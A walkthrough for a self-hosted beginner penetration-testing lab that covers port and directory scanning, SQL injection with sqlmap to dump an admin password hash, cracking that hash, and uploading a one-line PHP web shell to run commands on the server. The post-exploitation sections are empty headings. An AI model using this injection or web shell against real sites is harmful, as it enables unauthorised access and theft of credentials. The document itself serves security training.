Write Up Most Basic Penetration Testing Labs (MBPTL)
==============
***Self-deployed Straight-forward hacking lab machine which designed for new comer who want to learn Penetration Testing field that running inside Docker for easy setup.***

**Repository:** *https://github.com/bayufedra/MBPTL/*

**Author:** *Fedra Bayu*

> In this case, target IP is 103.31.33.37

# Reconnaissance
### Port Scanning
There are various tools for conduct port scanning, but the most commonly used currently is nmap because of it's accuracy of the results. as an alternative there is masscan, rustscan and others.

#### Install Nmap
```
sudo apt install nmap
```

#### Basic usage
```
nmap 103.31.33.37
```

#### Result
```
attacker@MBPTL:~$ nmap 103.31.33.37
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-01 00:00 WIB
Nmap scan report for ip-37-33-31-103.xxx-1337.mbptl.io (103.31.33.37)
Host is up (0.00073s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 4.76 seconds
```
We find two HTTP Ports open in port 80 and 8080


### Information Gathering
HTTP and HTTPS Protocol sometime contain some information in their response header and we can gather some information from it. here we will using `curl` tools.

#### Install curl
```
sudo apt install nmap curl
```

#### Basic usage
we will use `-I` flags so it only print the headers response 
```
curl -I 103.31.33.37
```

#### Port 80 Result
```
❯ curl -I http://103.31.33.37/
HTTP/1.1 200 OK
Date: Thu, 07 Mar 2024 14:38:43 GMT
Server: Apache/2.4.52 (Debian)
X-Powered-By: PHP/7.3.33
Content-Type: text/html; charset=UTF-8
```

#### Port 8080 Result
```
❯ curl -I http://103.31.33.37:8080/
HTTP/1.1 200 OK
Date: Thu, 07 Mar 2024 14:39:31 GMT
Server: Apache/2.4.52 (Debian)
Last-Modified: Tue, 27 Feb 2024 14:40:33 GMT
ETag: "804-6125e02396e80"
Accept-Ranges: bytes
Content-Length: 2052
Vary: Accept-Encoding
Content-Type: text/html
```

### Directory Scanning
Since we found some HTTP port, we can gather more information in it about is any path is exists in these web or not by directory scanning and there are various tools for conduct directory scanning, here we will use `dirsearch` because it's easy to use as beginner. Make sure you have installed python to run this tools because this tools written in python.

#### Install Python3 and Pip3
```
sudo apt install python3 python3-pip -y
```

#### Clonse Dirsearch Repository
```
git clone https://github.com/maurosoria/dirsearch
```

#### Install python package requirements
```
cd dirsearch
pip3 install -r requirements.txt
```

#### Basic usage
```
❯ python3 dirsearch.py -u http://103.31.33.37/
```

#### Port 80 Result
```
❯ python3 dirsearch.py -u http://103.31.33.37/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11722

Output: /home/fedra/dirsearch/reports/http_103.31.33.37/__24-03-07_21-12-21.txt

Target: http://103.31.33.37/

[21:12:21] Starting:
[21:14:19] 301 -  314B  - /img  ->  http://103.31.33.37/img/
[21:14:19] 301 -  314B  - /inc  ->  http://103.31.33.37/inc/

Task Completed
```

#### Port 8080 Result
```
❯ python3 dirsearch.py -u http://103.31.33.37/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11722

Output: /home/fedra/dirsearch/reports/http_103.31.33.37_8080/__24-03-07_21-20-24.txt

Target: http://103.31.33.37:8080/

[21:20:24] Starting:
[21:21:26] 301 -  331B  - /administrator  ->  http://103.31.33.37:8080/administrator/
[21:21:26] 200 -    2KB - /administrator/
[21:21:26] 200 -    2KB - /administrator/index.php

Task Completed
```

We found some path directory exists in there, this information will useful later if we found some related data

# Vulnerability Analysis
After checking in two open port, we didn't find anything interesting in port 8080. But when we see web on port 80 having url `detail.php?id=1` when we click on `View Details` menu. When we add single quote `'` in the url, so the url will be like `detail.php?id=1'` the web will giving response like:
```
Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 1' at line 1
```
In this case, the web potential vulnerable to `SQL Injection` 

# Exploitation
### SQL Injection
We can exploit previous SQL Injection vulnerability using `sqlmap`, the most popular tools for exploiting SQL Injection. You need install python first to run this tools because this tools written in python.

#### Clone sqlmap Repository
```
git clone https://github.com/sqlmapproject/sqlmap
cd sqlmap
```

#### Basic usage
```
❯ python3 sqlmap.py -u <Vulnerable URL with Parameter>
```

#### Exploiting SQL Injection using sqlmap
We will using `--dbs` flag so it will list all of the database name
```
python3 sqlmap.py -u 'http://192.168.56.102/detail.php?id=1' --dbs
```

and we will get result
```
[22:19:30] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.52, PHP 7.3.33
back-end DBMS: MySQL >= 5.6
[22:19:30] [INFO] fetching database names
available databases [6]:
[*] administrator
[*] bookstore
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

As we see, the most interesting database to seek is `administrator` and we will dump this database using command below
```
python3 sqlmap.py -u 'http://192.168.56.102/detail.php?id=1' -D administrator --dump
```
And will getting this result
```
Database: administrator
Table: users
[1 entry]
+----+----------------------------------+----------+
| id | password                         | username |
+----+----------------------------------+----------+
| 1  | b9f385c68320e27d5a4ea0618eef4a94 | admin    |
+----+----------------------------------+----------+
```

### Cracking Password
We got credentials of the admin from the website, but the password seems to be hashed. we will crack the hash by using this website https://hashes.com/en/decrypt/hash and we found the real strings from the hash is `P@assw0rd!`. But where we will use this credentials? remember we see `/administrator` folder exists in port `8080`, right? And we successfully logged in there.

### Gaining Access to Server
After login we only see the file upload feature in it, since the website using `PHP` as it's backend we can try uploading `.php` file which containing malicious code in it. create new txt file, edit and write `<?php system($_GET["command"]); ?>` in there and rename it extension with `.php` and save it.
Other reference Malicious Code:
- https://github.com/bayufedra/Tiny-PHP-Webshell

After submit it, web will giving response `Book inserted successfully!`. but where this file is uploaded? as we remember the port `80` website shown some of table data, and yes we can know where the file is located from there by clicking on `View Details` first and on broken picture try to click right-click on it and choice `Open image in new tab`. We will see page with content like below
```
Warning: system(): Cannot execute a blank command in /var/www/html/administrator/uploads/e77a53f1b6b4aba6d1fc86e42767ce4c.php on line 1
```
Since server is linux based, now we can execute linux command in server with adding `?command=<linux-command>`. for example `?command=ls -lah` and we will get
```
total 16K
drwxrwxrwx 1 www-data www-data 4.0K Mar  7 15:32 .
drwxrwxr-x 1 root     root     4.0K Feb 27 14:40 ..
-rw-r--r-- 1 www-data www-data   34 Mar  7 15:32 e77a53f1b6b4aba6d1fc86e42767ce4c.php
-rwxrwxrwx 1 www-data www-data    0 Feb 27 14:40 index.php
```

# Post-Exploitation
### Reverse Shell
### Privilege Escalation
